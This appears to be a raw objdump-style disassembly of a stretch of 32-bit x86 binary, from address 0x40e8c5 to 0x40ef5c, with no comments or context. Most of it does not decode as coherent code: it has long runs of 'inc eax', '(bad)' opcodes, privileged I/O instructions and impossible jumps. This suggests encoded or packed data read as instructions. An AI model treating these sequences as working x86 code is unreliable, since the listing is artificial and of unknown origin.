  40e8c5:	int3   
  40e8c6:	jne    0x40e908
  40e8c8:	push   edi
  40e8c9:	sub    al,0x1b
  40e8cb:	or     BYTE PTR [ebp-0x10],0xd0
  40e8cf:	arpl   WORD PTR [eax-0x75],ax
  40e8d2:	test   eax,0x4ff1efc3
  40e8d7:	aas    
  40e8d8:	pop    ss
  40e8d9:	add    eax,0x4163b4b8
  40e8de:	fst    QWORD PTR [ebx]
  40e8e0:	stos   BYTE PTR es:[edi],al
  40e8e1:	xchg   BYTE PTR [ecx+0x15],al
  40e8e4:	rol    BYTE PTR [ebx+0x34],cl
  40e8e7:	and    DWORD PTR [eax+0x0],eax
  40e8ea:	rol    DWORD PTR [eax+0x40],0x40
  40e8ee:	inc    eax
  40e8ef:	add    BYTE PTR [eax+0x40],al
  40e8f2:	and    dl,BYTE PTR [esi+0x46]
  40e8f5:	dec    ebp
  40e8f6:	xor    BYTE PTR [edx+0x288a2f4c],ch
  40e8fc:	outs   dx,DWORD PTR ds:[esi]
  40e8fd:	push   edx
  40e8fe:	sbb    al,0xab
  40e900:	mov    eax,ds:0x74a60573
  40e905:	inc    edx
  40e906:	dec    esi
  40e907:	nop
  40e908:	xlat   BYTE PTR ds:[ebx]
  40e909:	inc    eax
  40e90a:	xchg   al,cl
  40e90c:	bound  eax,QWORD PTR [edi]
  40e90e:	lea    ebp,[edi+0x682130a1]
  40e914:	dec    eax
  40e915:	inc    eax
  40e916:	inc    eax
  40e917:	inc    eax
  40e918:	inc    eax
  40e919:	inc    eax
  40e91a:	inc    eax
  40e91b:	inc    eax
  40e91c:	inc    eax
  40e91d:	inc    DWORD PTR [eax+0x35]
  40e920:	inc    ebx
  40e921:	lock cmp eax,0x24878940
  40e927:	retf   
  40e928:	nop
  40e929:	mov    ah,BYTE PTR [ecx]
  40e92b:	cmp    DWORD PTR ds:0x40500536,eax
  40e931:	inc    eax
  40e932:	inc    eax
  40e933:	inc    eax
  40e934:	inc    eax
  40e935:	inc    eax
  40e936:	inc    eax
  40e937:	inc    eax
  40e938:	inc    eax
  40e939:	inc    eax
  40e93a:	sbb    BYTE PTR [edi+0x23],0x4d
  40e93e:	xchg   BYTE PTR [ecx-0x47bcf59d],ah
  40e944:	loop   0x40e986
  40e946:	bound  ebp,QWORD PTR cs:[ebp+0x73]
  40e94a:	ror    DWORD PTR [edx+0x79880367],1
  40e950:	bound  eax,QWORD PTR [edi]
  40e952:	inc    ecx
  40e953:	outs   dx,BYTE PTR ds:[esi]
  40e954:	pop    ss
  40e955:	bound  eax,QWORD PTR ds:0x256325bc
  40e95b:	adc    ah,BYTE PTR [ebx+0x53]
  40e95e:	inc    eax
  40e95f:	inc    eax
  40e960:	inc    eax
  40e961:	inc    eax
  40e962:	inc    eax
  40e963:	inc    eax
  40e964:	inc    eax
  40e965:	inc    eax
  40e966:	add    BYTE PTR [esi+0x45ac6363],al
  40e96c:	sti    
  40e96d:	inc    ecx
  40e96e:	inc    ecx
  40e96f:	and    eax,0xa005979c
  40e974:	lods   eax,DWORD PTR ds:[esi]
  40e975:	mov    eax,ds:0x346c8741
  40e97a:	retf   
  40e97b:	inc    ecx
  40e97c:	inc    eax
  40e97d:	inc    eax
  40e97e:	inc    eax
  40e97f:	inc    eax
  40e980:	inc    eax
  40e981:	inc    eax
  40e982:	and    eax,0xe9404040
  40e987:	mov    ebx,0x4c630540
  40e98c:	dec    esp
  40e98d:	inc    ebx
  40e98e:	dec    ebx
  40e98f:	sbb    ebp,DWORD PTR ds:0x41570586
  40e995:	xor    BYTE PTR [edx+eiz*8-0x2234c6dd],dl
  40e99c:	ins    DWORD PTR es:[edi],dx
  40e99d:	sbb    BYTE PTR [eax],ah
  40e99f:	cs inc eax
  40e9a1:	xchg   BYTE PTR [eax+0x40],dl
  40e9a4:	lods   al,BYTE PTR ds:[esi]
  40e9a5:	inc    edi
  40e9a6:	pop    ebx
  40e9a7:	dec    edi
  40e9a8:	xor    al,BYTE PTR [eax+0x40]
  40e9ab:	inc    eax
  40e9ac:	inc    eax
  40e9ad:	inc    eax
  40e9ae:	inc    eax
  40e9af:	inc    eax
  40e9b0:	inc    eax
  40e9b1:	inc    eax
  40e9b2:	inc    eax
  40e9b3:	add    eax,0x854894ce
  40e9b8:	mov    cl,ah
  40e9ba:	ja     0x40e942
  40e9bc:	shr    DWORD PTR [eax+0x6d],0x43
  40e9c0:	jecxz  0x40e9de
  40e9c2:	inc    eax
  40e9c3:	xor    bl,BYTE PTR [edx+0x4040ada0]
  40e9c9:	inc    eax
  40e9ca:	inc    eax
  40e9cb:	inc    eax
  40e9cc:	inc    eax
  40e9cd:	rol    DWORD PTR [eax+0x40],0x90
  40e9d1:	daa    
  40e9d2:	and    ebp,DWORD PTR [edi]
  40e9d4:	test   DWORD PTR [eax+0x6b9f6764],ebp
  40e9da:	pop    ss
  40e9db:	or     eax,DWORD PTR ds:0x43345611
  40e9e1:	push   ds
  40e9e2:	mov    ds:0x28bc8640,eax
  40e9e7:	dec    eax
  40e9e8:	shl    DWORD PTR [ebx+0x79],1
  40e9eb:	xchg   ebp,eax
  40e9ec:	and    eax,0x766d4842
  40e9f1:	inc    eax
  40e9f2:	inc    eax
  40e9f3:	add    BYTE PTR [eax+0x40],al
  40e9f6:	inc    eax
  40e9f7:	inc    eax
  40e9f8:	inc    eax
  40e9f9:	inc    eax
  40e9fa:	cwde   
  40e9fb:	popa   
  40e9fc:	adc    BYTE PTR [edx+ebx*1+0x76dbef05],al
  40ea03:	inc    ebx
  40ea04:	inc    edi
  40ea05:	add    eax,0x50d843b4
  40ea0a:	(bad)  
  40ea0b:	popa   
  40ea0c:	inc    eax
  40ea0d:	xchg   BYTE PTR [eax+0x40],al
  40ea10:	inc    eax
  40ea11:	inc    eax
  40ea12:	inc    eax
  40ea13:	inc    eax
  40ea14:	inc    eax
  40ea15:	inc    eax
  40ea16:	inc    eax
  40ea17:	inc    eax
  40ea18:	bound  ebp,QWORD PTR [esi]
  40ea1a:	jl     0x40ea01
  40ea1c:	add    ecx,DWORD PTR [ebx]
  40ea1e:	xor    esi,DWORD PTR [esi]
  40ea20:	call   0xf2824d44
  40ea25:	mov    eax,ds:0x40404040
  40ea2a:	inc    eax
  40ea2b:	inc    eax
  40ea2c:	int3   
  40ea2d:	jne    0x40ea6f
  40ea2f:	cli    
  40ea30:	cmp    DWORD PTR [eax-0x7dbc08ae],0xffffffff
  40ea37:	inc    ebx
  40ea38:	add    eax,0x30483763
  40ea3d:	add    BYTE PTR [eax+0x1a],al
  40ea40:	xchg   BYTE PTR [eax+eax*2],cl
  40ea43:	add    cl,al
  40ea45:	inc    eax
  40ea46:	inc    eax
  40ea47:	inc    eax
  40ea48:	inc    eax
  40ea49:	add    BYTE PTR [eax+0x46],al
  40ea4c:	bound  edx,QWORD PTR [esi+ecx*4]
  40ea4f:	mov    al,ds:0x35602f40
  40ea54:	test   eax,0x2623fa43
  40ea59:	and    BYTE PTR [edx+0x4d],0x4
  40ea5d:	fisttp QWORD PTR [edi+0xb054042]
  40ea63:	jnp    0x40eaa6
  40ea65:	imul   esi,ebp,0x60
  40ea68:	sub    al,0x86
  40ea6a:	sub    al,0xb8
  40ea6c:	push   edx
  40ea6d:	fwait
  40ea6e:	push   ds
  40ea6f:	xor    bl,BYTE PTR [eax]
  40ea71:	inc    eax
  40ea72:	inc    eax
  40ea73:	inc    eax
  40ea74:	inc    eax
  40ea75:	inc    eax
  40ea76:	inc    eax
  40ea77:	inc    eax
  40ea78:	inc    eax
  40ea79:	inc    DWORD PTR [eax+0x23]
  40ea7c:	bound  ecx,QWORD PTR ds:0x4d45bc27
  40ea82:	dec    esi
  40ea83:	sbb    DWORD PTR [edx],0x92432041
  40ea89:	popa   
  40ea8a:	inc    eax
  40ea8b:	add    eax,0xd23188b4
  40ea90:	or     BYTE PTR fs:[eax],cl
  40ea93:	xchg   BYTE PTR [edx+0x40],ah
  40ea96:	inc    eax
  40ea97:	inc    eax
  40ea98:	inc    eax
  40ea99:	inc    eax
  40ea9a:	inc    eax
  40ea9b:	inc    eax
  40ea9c:	inc    eax
  40ea9d:	inc    eax
  40ea9e:	inc    eax
  40ea9f:	xor    BYTE PTR [ecx-0x1d5c097e],ch
  40eaa5:	and    eax,0xfaca13c
  40eaaa:	addr16 push esi
  40eaac:	dec    eax
  40eaad:	add    al,0xf4
  40eab0:	add    eax,0x78e889e5
  40eab5:	add    eax,0x40404040
  40eaba:	inc    eax
  40eabb:	inc    eax
  40eabc:	inc    eax
  40eabd:	inc    eax
  40eabe:	add    BYTE PTR [ebp+0x62],ah
  40eac1:	leave  
  40eac2:	mov    ah,0x8e
  40eac4:	ins    BYTE PTR es:[edi],dx
  40eac5:	inc    eax
  40eac6:	xchg   BYTE PTR [ecx-0x78bebd28],dl
  40eacc:	out    dx,al
  40eacd:	je     0x40eb01
  40eacf:	inc    esi
  40ead0:	add    BYTE PTR [ebx+0x43],al
  40ead3:	dec    esp
  40ead4:	add    al,BYTE PTR [eax-0x1]
  40ead7:	fld    DWORD PTR [eax+0x40]
  40eada:	inc    eax
  40eadb:	inc    eax
  40eadc:	inc    eax
  40eadd:	inc    eax
  40eade:	and    eax,0x62404040
  40eae3:	test   al,0x30
  40eae5:	ret    
  40eae6:	and    DWORD PTR [eax+0x5],esi
  40eae9:	enter  0xd8e8,0x10
  40eaed:	ficom  WORD PTR [ebx-0x20]
  40eaf0:	xchg   BYTE PTR [esi-0x45],al
  40eaf3:	push   eax
  40eaf4:	inc    edi
  40eaf5:	mov    al,0x21
  40eaf7:	inc    eax
  40eaf8:	pusha  
  40eaf9:	cmp    DWORD PTR [eax+0x40],eax
  40eafc:	inc    eax
  40eafd:	inc    eax
  40eafe:	inc    eax
  40eaff:	inc    eax
  40eb00:	inc    eax
  40eb01:	inc    eax
  40eb02:	inc    eax
  40eb03:	inc    eax
  40eb04:	test   al,0x10
  40eb06:	test   DWORD PTR [eax],edi
  40eb08:	dec    ecx
  40eb09:	jb     0x40eb09
  40eb0b:	gs pusha 
  40eb0d:	ins    DWORD PTR es:[edi],dx
  40eb0e:	inc    ebx
  40eb0f:	mov    cl,0xa1
  40eb11:	inc    eax
  40eb12:	add    eax,0x4082f1a8
  40eb17:	inc    eax
  40eb18:	inc    eax
  40eb19:	inc    eax
  40eb1a:	inc    eax
  40eb1b:	inc    eax
  40eb1c:	rol    DWORD PTR [eax+0x40],0x90
  40eb20:	xlat   BYTE PTR ds:[ebx]
  40eb21:	push   esp
  40eb22:	ins    DWORD PTR es:[edi],dx
  40eb23:	xchg   BYTE PTR [eax-0x50],al
  40eb26:	arpl   WORD PTR [ecx-0x18],bx
  40eb29:	pusha  
  40eb2a:	inc    eax
  40eb2b:	cmp    eax,0x43ac152a
  40eb30:	jmp    0x40412b75
  40eb35:	inc    eax
  40eb36:	inc    eax
  40eb37:	inc    eax
  40eb38:	inc    eax
  40eb39:	inc    eax
  40eb3a:	and    eax,0xcb41fd01
  40eb3f:	or     eax,0x40c97dd1
  40eb44:	add    eax,0x6ecbac1c
  40eb49:	jle    0x40eb6f
  40eb4b:	adc    eax,DWORD PTR [esi-0x7db3b920]
  40eb51:	and    DWORD PTR [edi-0x209dcbc0],eax
  40eb57:	inc    ecx
  40eb58:	pop    ebp
  40eb59:	inc    eax
  40eb5a:	inc    eax
  40eb5b:	inc    eax
  40eb5c:	inc    eax
  40eb5d:	inc    eax
  40eb5e:	inc    eax
  40eb5f:	inc    eax
  40eb60:	inc    eax
  40eb61:	inc    eax
  40eb62:	inc    eax
  40eb63:	pop    ecx
  40eb64:	inc    eax
  40eb65:	inc    eax
  40eb66:	cld    
  40eb67:	or     DWORD PTR [esi+edi*2],ecx
  40eb6a:	sub    al,0x45
  40eb6c:	popa   
  40eb6d:	adc    al,BYTE PTR ds:0x41b86368
  40eb73:	retf   0x7eb5
  40eb76:	xchg   BYTE PTR [edx-0x42],ah
  40eb79:	and    eax,DWORD PTR [ebx+0x40]
  40eb7c:	inc    eax
  40eb7d:	inc    eax
  40eb7e:	inc    eax
  40eb7f:	inc    eax
  40eb80:	inc    eax
  40eb81:	int3   
  40eb82:	jne    0x40ebc4
  40eb84:	push   edx
  40eb85:	dec    eax
  40eb86:	inc    eax
  40eb87:	sub    al,0x5a
  40eb89:	inc    esp
  40eb8a:	pop    eax
  40eb8b:	xor    BYTE PTR [eax],ch
  40eb8d:	test   eax,0x6210fb27
  40eb92:	bound  ecx,QWORD PTR [esi+ebp*1]
  40eb95:	xor    al,0x40
  40eb97:	add    eax,0x473f257d
  40eb9c:	sbb    ebp,DWORD PTR [ebx+0x40862e]
  40eba2:	rol    DWORD PTR [eax+0x40],0x40
  40eba6:	inc    eax
  40eba7:	add    BYTE PTR [eax+0x62],al
  40ebaa:	mov    bh,0xa0
  40ebac:	test   edx,esi
  40ebae:	xor    al,0xc6
  40ebb0:	xor    eax,0x4372bf48
  40ebb5:	dec    eax
  40ebb6:	mov    edi,0xbfc8fa40
  40ebbb:	xor    al,0x90
  40ebbd:	jl     0x40ebf3
  40ebbf:	sub    al,0x5
  40ebc1:	sub    edi,DWORD PTR [eax+ecx*2+0x40bf4376]
  40ebc8:	inc    eax
  40ebc9:	inc    eax
  40ebca:	inc    eax
  40ebcb:	inc    eax
  40ebcc:	inc    eax
  40ebcd:	inc    eax
  40ebce:	inc    eax
  40ebcf:	inc    DWORD PTR [eax+0x62]
  40ebd2:	xchg   al,al
  40ebd4:	icebp  
  40ebd5:	inc    esi
  40ebd6:	test   al,0x2e
  40ebd8:	xor    al,0x62
  40ebda:	and    DWORD PTR [ecx+0x2d40e3a8],esi
  40ebe0:	mov    edi,0x4040f940
  40ebe5:	inc    eax
  40ebe6:	inc    eax
  40ebe7:	inc    eax
  40ebe8:	inc    eax
  40ebe9:	inc    eax
  40ebea:	inc    eax
  40ebeb:	inc    eax
  40ebec:	inc    eax
  40ebed:	arpl   WORD PTR [ebp+eax*1+0x2a],ax
  40ebf1:	retf   0x3348
  40ebf4:	add    eax,0x4634440b
  40ebf9:	sbb    eax,0xd4865261
  40ebfe:	fadd   DWORD PTR [eax]
  40ec00:	sub    ah,bl
  40ec02:	pop    eax
  40ec03:	inc    eax
  40ec04:	bound  eax,QWORD PTR es:[eax-0x5ee06505]
  40ec0b:	mov    esp,0x404040f8
  40ec10:	inc    eax
  40ec11:	inc    eax
  40ec12:	inc    eax
  40ec13:	inc    eax
  40ec14:	inc    eax
  40ec15:	add    BYTE PTR [esi+0x6c],ch
  40ec18:	jecxz  0x40ec70
  40ec1a:	push   0x6e
  40ec1c:	inc    eax
  40ec1d:	add    eax,0xe8ce6235
  40ec22:	jecxz  0x40ec06
  40ec24:	sub    al,0x86
  40ec26:	rol    BYTE PTR [eax+0x34],0x7d
  40ec2a:	fwait
  40ec2b:	mov    edi,0x2472540
  40ec30:	les    eax,FWORD PTR [edi-0x6a]
  40ec33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec34:	sub    bh,dh
  40ec36:	inc    eax
  40ec37:	inc    eax
  40ec38:	inc    eax
  40ec39:	inc    eax
  40ec3a:	inc    eax
  40ec3b:	inc    eax
  40ec3c:	and    eax,0x40404040
  40ec41:	dec    esi
  40ec42:	dec    edi
  40ec43:	inc    ebx
  40ec44:	sub    al,BYTE PTR [eax-0x20]
  40ec47:	add    eax,0x3050c84e
  40ec4c:	lahf   
  40ec4d:	mov    eax,ds:0xe3438640
  40ec52:	mov    al,ds:0x23394908
  40ec57:	and    al,0x3f
  40ec59:	inc    eax
  40ec5a:	inc    eax
  40ec5b:	inc    eax
  40ec5c:	inc    eax
  40ec5d:	inc    eax
  40ec5e:	inc    eax
  40ec5f:	inc    eax
  40ec60:	inc    eax
  40ec61:	inc    eax
  40ec62:	inc    eax
  40ec63:	inc    ecx
  40ec64:	ret    
  40ec65:	inc    edi
  40ec66:	fucom  st(7)
  40ec68:	inc    eax
  40ec69:	not    BYTE PTR [eax+0x5f8542a8]
  40ec6f:	cmp    DWORD PTR [ebx],esi
  40ec71:	add    eax,0x4391c364
  40ec76:	aad    0xff
  40ec78:	sbb    al,0x86
  40ec7a:	dec    esi
  40ec7b:	mov    esp,0x395a9028
  40ec80:	inc    edx
  40ec81:	cmp    ebp,DWORD PTR [eax*1-0xb1ecaf]
  40ec88:	push   ss
  40ec89:	inc    eax
  40ec8a:	inc    eax
  40ec8b:	inc    eax
  40ec8c:	inc    eax
  40ec8d:	inc    eax
  40ec8e:	inc    eax
  40ec8f:	rol    DWORD PTR [eax+0x40],0xf5
  40ec93:	inc    ebx
  40ec94:	out    dx,eax
  40ec95:	hlt    
  40ec96:	inc    ebx
  40ec97:	stos   DWORD PTR es:[edi],eax
  40ec98:	and    edi,DWORD PTR [eax*1-0x2e98b034]
  40ec9f:	out    dx,eax
  40eca0:	aas    
  40eca1:	inc    esp
  40eca2:	xchg   BYTE PTR [eax+0x40],al
  40eca5:	add    BYTE PTR [eax+0x40],al
  40eca8:	inc    eax
  40eca9:	inc    eax
  40ecaa:	inc    eax
  40ecab:	inc    eax
  40ecac:	rol    BYTE PTR [eax+0x47],1
  40ecaf:	ja     0x40ed0e
  40ecb1:	jns    0x40ecde
  40ecb3:	pusha  
  40ecb4:	dec    ecx
  40ecb5:	inc    eax
  40ecb6:	push   esp
  40ecb7:	xor    eax,0xf44a6323
  40ecbc:	aas    
  40ecbd:	call   0x22aff22a
  40ecc2:	fs add eax,0xe234fb1c
  40ecc8:	mul    BYTE PTR [edx]
  40ecca:	inc    eax
  40eccb:	xchg   BYTE PTR [eax+0x40],al
  40ecce:	inc    eax
  40eccf:	inc    eax
  40ecd0:	inc    eax
  40ecd1:	inc    eax
  40ecd2:	inc    eax
  40ecd3:	inc    eax
  40ecd4:	inc    eax
  40ecd5:	inc    eax
  40ecd6:	test   al,0xa8
  40ecd8:	pusha  
  40ecd9:	inc    ecx
  40ecda:	add    edi,DWORD PTR [edi]
  40ecdc:	and    DWORD PTR [eax+eax*2],esi
  40ecdf:	inc    eax
  40ece0:	jnp    0x40ed25
  40ece2:	lds    esp,FWORD PTR [ecx]
  40ece4:	je     0x40ecd9
  40ece6:	sub    ch,BYTE PTR [edx]
  40ece8:	inc    eax
  40ece9:	inc    eax
  40ecea:	inc    eax
  40eceb:	inc    eax
  40ecec:	inc    eax
  40eced:	inc    eax
  40ecee:	int3   
  40ecef:	jne    0x40ed31
  40ecf1:	out    0x30,al
  40ecf3:	aaa    
  40ecf4:	and    DWORD PTR [eax+0x5],eax
  40ecf7:	inc    ecx
  40ecf8:	inc    ecx
  40ecf9:	pop    ebx
  40ecfa:	add    al,0xe6
  40ecfc:	and    DWORD PTR [ebx],esi
  40ecfe:	xchg   BYTE PTR [ebx],al
  40ed00:	sub    al,BYTE PTR [eax+0x0]
  40ed03:	rol    DWORD PTR [eax+0x40],0x40
  40ed07:	inc    eax
  40ed08:	add    BYTE PTR [eax-0x55],al
  40ed0b:	inc    edi
  40ed0c:	mov    ds:0xc4255c60,eax
  40ed11:	adc    BYTE PTR [ebp+eax*4-0xdbfe64c],ch
  40ed18:	bound  edx,QWORD PTR [ecx]
  40ed1a:	jns    0x40ed5f
  40ed1c:	cld    
  40ed1d:	inc    eax
  40ed1e:	inc    eax
  40ed1f:	inc    eax
  40ed20:	inc    eax
  40ed21:	inc    eax
  40ed22:	inc    eax
  40ed23:	inc    eax
  40ed24:	inc    eax
  40ed25:	inc    DWORD PTR [eax+0x60]
  40ed28:	xor    al,BYTE PTR ds:0x909f893b
  40ed2e:	push   0x44867c3f
  40ed33:	jae    0x40ed97
  40ed35:	xor    BYTE PTR [esi-0x30],cl
  40ed38:	inc    edx
  40ed39:	xor    esp,DWORD PTR [edx-0x44]
  40ed3c:	inc    ebx
  40ed3d:	inc    ebx
  40ed3e:	mov    al,0x81
  40ed40:	pusha  
  40ed41:	icebp  
  40ed42:	rol    DWORD PTR ds:0x519bd1b9,0xea
  40ed49:	add    eax,0x40404034
  40ed4e:	inc    eax
  40ed4f:	inc    eax
  40ed50:	inc    eax
  40ed51:	inc    eax
  40ed52:	inc    eax
  40ed53:	inc    eax
  40ed54:	inc    eax
  40ed55:	retf   
  40ed56:	or     eax,0x8880cc19
  40ed5b:	xchg   BYTE PTR [eax-0x7467099b],bh
  40ed61:	cs inc eax
  40ed63:	inc    eax
  40ed64:	inc    eax
  40ed65:	inc    eax
  40ed66:	inc    eax
  40ed67:	inc    eax
  40ed68:	inc    eax
  40ed69:	inc    eax
  40ed6a:	add    BYTE PTR [eax+0x6f],al
  40ed6d:	add    eax,0x5f124f34
  40ed72:	push   0x4c87f029
  40ed77:	push   esp
  40ed78:	in     eax,dx
  40ed79:	cmp    eax,DWORD PTR [ecx+0x403b0540]
  40ed7f:	add    DWORD PTR [ecx+0x30],eax
  40ed82:	inc    eax
  40ed83:	inc    eax
  40ed84:	inc    eax
  40ed85:	inc    eax
  40ed86:	inc    eax
  40ed87:	inc    eax
  40ed88:	and    eax,0x3d404040
  40ed8d:	sub    eax,0xc94b3486
  40ed92:	inc    ebx
  40ed93:	pop    esp
  40ed94:	adc    al,0x28
  40ed96:	pusha  
  40ed97:	inc    edx
  40ed98:	sub    BYTE PTR [edx+0x30],al
  40ed9b:	ja     0x40ed1d
  40ed9d:	inc    esp
  40ed9e:	out    dx,eax
  40ed9f:	arpl   WORD PTR [ebp-0x35],dx
  40eda2:	add    BYTE PTR [edi],bl
  40eda4:	pop    ds
  40eda5:	and    al,0x5
  40eda7:	xor    BYTE PTR [ebx+0x40],bh
  40edaa:	inc    eax
  40edab:	inc    eax
  40edac:	inc    eax
  40edad:	inc    eax
  40edae:	inc    eax
  40edaf:	inc    eax
  40edb0:	inc    eax
  40edb1:	inc    eax
  40edb2:	inc    eax
  40edb3:	inc    edi
  40edb4:	inc    edi
  40edb5:	add    eax,0x3186405c
  40edba:	adc    eax,0x1aa8540
  40edbf:	xor    dh,BYTE PTR [esp+edx*2]
  40edc2:	mov    dh,0xc0
  40edc4:	inc    ebx
  40edc5:	lods   eax,DWORD PTR ds:[esi]
  40edc6:	inc    edx
  40edc7:	inc    eax
  40edc8:	inc    eax
  40edc9:	inc    eax
  40edca:	inc    eax
  40edcb:	inc    eax
  40edcc:	inc    eax
  40edcd:	rol    DWORD PTR [eax+0x40],0xc8
  40edd1:	out    dx,al
  40edd2:	bound  esp,QWORD PTR [edx+0x6a]
  40edd5:	nop
  40edd6:	aas    
  40edd7:	add    BYTE PTR [eax+0x5],al
  40edda:	je     0x40eda4
  40eddc:	loope  0x40edab
  40edde:	xor    al,BYTE PTR [eax+0x40]
  40ede1:	add    BYTE PTR [eax+0x40],al
  40ede4:	inc    eax
  40ede5:	inc    eax
  40ede6:	inc    eax
  40ede7:	inc    eax
  40ede8:	and    eax,0x24388635
  40eded:	and    al,0x43
  40edef:	pusha  
  40edf0:	dec    esi
  40edf1:	inc    eax
  40edf2:	sub    ebx,eax
  40edf4:	push   ebx
  40edf5:	inc    eax
  40edf6:	inc    eax
  40edf7:	inc    eax
  40edf8:	inc    eax
  40edf9:	inc    eax
  40edfa:	inc    eax
  40edfb:	inc    eax
  40edfc:	inc    eax
  40edfd:	inc    eax
  40edfe:	inc    eax
  40edff:	mov    dl,cl
  40ee01:	xor    al,0x81
  40ee03:	aaa    
  40ee04:	in     eax,dx
  40ee05:	into   
  40ee06:	dec    eax
  40ee07:	shl    edi,0xa5
  40ee0a:	jg     0x40ee4c
  40ee0c:	add    eax,0x33430da8
  40ee11:	xor    eax,0x24866082
  40ee16:	imul   esi,esi,0x7a
  40ee19:	sub    BYTE PTR [eax+0x40],ah
  40ee1c:	and    al,0x2a
  40ee1e:	dec    esp
  40ee1f:	pop    ebp
  40ee20:	(bad)  
  40ee21:	retf   0x4040
  40ee24:	inc    eax
  40ee25:	inc    eax
  40ee26:	inc    eax
  40ee27:	inc    eax
  40ee28:	int3   
  40ee29:	jne    0x40ee6b
  40ee2b:	imul   BYTE PTR [esi]
  40ee2d:	in     al,dx
  40ee2e:	inc    edx
  40ee2f:	or     eax,0x571f41ab
  40ee34:	inc    eax
  40ee35:	add    eax,0x43544209
  40ee3a:	out    dx,eax
  40ee3b:	add    BYTE PTR [eax-0x7a],0x3c
  40ee3f:	adc    DWORD PTR [ecx],eax
  40ee41:	xor    BYTE PTR [edi],al
  40ee43:	inc    eax
  40ee44:	add    cl,al
  40ee46:	inc    eax
  40ee47:	inc    eax
  40ee48:	inc    eax
  40ee49:	inc    eax
  40ee4a:	add    BYTE PTR [eax+0x69],al
  40ee4d:	and    eax,0xc9d86325
  40ee52:	jl     0x40ee4a
  40ee54:	jb     0x40ee96
  40ee56:	jmp    0x40ee08
  40ee58:	bound  esp,QWORD PTR [esi]
  40ee5a:	inc    edi
  40ee5b:	pop    ebp
  40ee5c:	xor    DWORD PTR [eax*1-0x7abd7d1b],0x864028f3
  40ee67:	mov    ch,0x1e
  40ee69:	retf   
  40ee6a:	inc    ebx
  40ee6b:	add    DWORD PTR es:[ecx],esp
  40ee6e:	inc    eax
  40ee6f:	inc    eax
  40ee70:	inc    eax
  40ee71:	inc    eax
  40ee72:	inc    eax
  40ee73:	inc    eax
  40ee74:	inc    eax
  40ee75:	inc    eax
  40ee76:	inc    DWORD PTR [eax+0x24]
  40ee79:	bound  esp,QWORD PTR ds:0x429a9026
  40ee7f:	inc    eax
  40ee80:	jmp    0xf6:0xea4677e9
  40ee87:	add    al,0x5
  40ee89:	cmp    al,0x38
  40ee8b:	inc    eax
  40ee8c:	inc    ebx
  40ee8d:	xchg   DWORD PTR [ebx],esi
  40ee8f:	inc    eax
  40ee90:	xchg   BYTE PTR [edx-0x8],ch
  40ee93:	sub    al,0xd1
  40ee95:	dec    ebx
  40ee96:	sub    eax,0x40404040
  40ee9b:	inc    eax
  40ee9c:	inc    eax
  40ee9d:	inc    eax
  40ee9e:	inc    eax
  40ee9f:	inc    eax
  40eea0:	inc    eax
  40eea1:	cmc    
  40eea2:	and    eax,DWORD PTR [ecx]
  40eea4:	ret    
  40eea5:	push   0xffffffe5
  40eea7:	inc    edi
  40eea8:	mov    al,dh
  40eeaa:	jmp    0x86412f6b
  40eeaf:	adc    ch,BYTE PTR [eax+0x6d]
  40eeb2:	add    eax,0x408a8263
  40eeb7:	inc    eax
  40eeb8:	inc    eax
  40eeb9:	inc    eax
  40eeba:	inc    eax
  40eebb:	inc    eax
  40eebc:	inc    eax
  40eebd:	inc    eax
  40eebe:	add    BYTE PTR [edi-0x79280594],dl
  40eec4:	inc    esp
  40eec5:	sub    eax,ebx
  40eec7:	aaa    
  40eec8:	xchg   ebx,eax
  40eec9:	inc    eax
  40eeca:	cmp    esp,DWORD PTR [edx]
  40eecc:	sub    al,0x42
  40eece:	pop    eax
  40eecf:	inc    ecx
  40eed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eed1:	pop    ds
  40eed2:	adc    al,0xe8
  40eed4:	nop
  40eed5:	js     0x40ef17
  40eed7:	inc    eax
  40eed8:	inc    eax
  40eed9:	inc    eax
  40eeda:	inc    eax
  40eedb:	inc    eax
  40eedc:	and    eax,0x11404040
  40eee1:	inc    ebx
  40eee2:	cmp    eax,0x44e40160
  40eee7:	cmp    BYTE PTR [edx+0x30],al
  40eeea:	rol    DWORD PTR [esi+eax*2],1
  40eeed:	inc    eax
  40eeee:	inc    eax
  40eeef:	inc    eax
  40eef0:	inc    eax
  40eef1:	inc    eax
  40eef2:	inc    eax
  40eef3:	inc    eax
  40eef4:	inc    eax
  40eef5:	inc    eax
  40eef6:	inc    eax
  40eef7:	inc    eax
  40eef8:	sub    eax,0xd7841ea
  40eefd:	outs   dx,DWORD PTR ds:[esi]
  40eefe:	inc    ebp
  40eeff:	sahf   
  40ef00:	(bad)  
  40ef01:	shl    BYTE PTR [eax],0x47
  40ef04:	ret    
  40ef05:	inc    esi
  40ef06:	xchg   edx,eax
  40ef07:	jl     0x40ef49
  40ef09:	inc    eax
  40ef0a:	inc    eax
  40ef0b:	inc    eax
  40ef0c:	inc    eax
  40ef0d:	inc    eax
  40ef0e:	rol    DWORD PTR [eax+0x40],0xc0
  40ef12:	push   edx
  40ef13:	jnp    0x40ee9a
  40ef15:	test   al,0x85
  40ef17:	jg     0x40ef7c
  40ef19:	inc    esp
  40ef1a:	(bad)  
  40ef1b:	stos   DWORD PTR es:[edi],eax
  40ef1c:	inc    ebx
  40ef1d:	jb     0x40ef5f
  40ef1f:	inc    eax
  40ef20:	add    BYTE PTR [eax+0x40],al
  40ef23:	inc    eax
  40ef24:	inc    eax
  40ef25:	inc    eax
  40ef26:	inc    eax
  40ef27:	dec    eax
  40ef28:	inc    eax
  40ef29:	mov    ch,0x2e
  40ef2b:	test   eax,0xf69054
  40ef30:	xor    al,0xc6
  40ef32:	in     al,dx
  40ef33:	jnp    0x40ef36
  40ef35:	inc    eax
  40ef36:	inc    eax
  40ef37:	inc    eax
  40ef38:	inc    eax
  40ef39:	inc    eax
  40ef3a:	inc    eax
  40ef3b:	inc    eax
  40ef3c:	inc    eax
  40ef3d:	inc    eax
  40ef3e:	inc    eax
  40ef3f:	xchg   ebx,ecx
  40ef41:	daa    
  40ef42:	push   ds
  40ef43:	dec    edi
  40ef44:	sahf   
  40ef45:	sub    al,BYTE PTR [ecx+0x43]
  40ef48:	cmp    al,0x79
  40ef4a:	xor    eax,DWORD PTR [ebp-0x7f]
  40ef4d:	popa   
  40ef4e:	mov    ch,0xd1
  40ef50:	rol    DWORD PTR [ecx],0x2
  40ef53:	inc    ecx
  40ef54:	(bad)  
  40ef55:	aam    0xc8
  40ef57:	xor    al,0x29
  40ef59:	ins    DWORD PTR es:[edi],dx
  40ef5a:	adc    al,0xf9
  40ef5c:	retf   
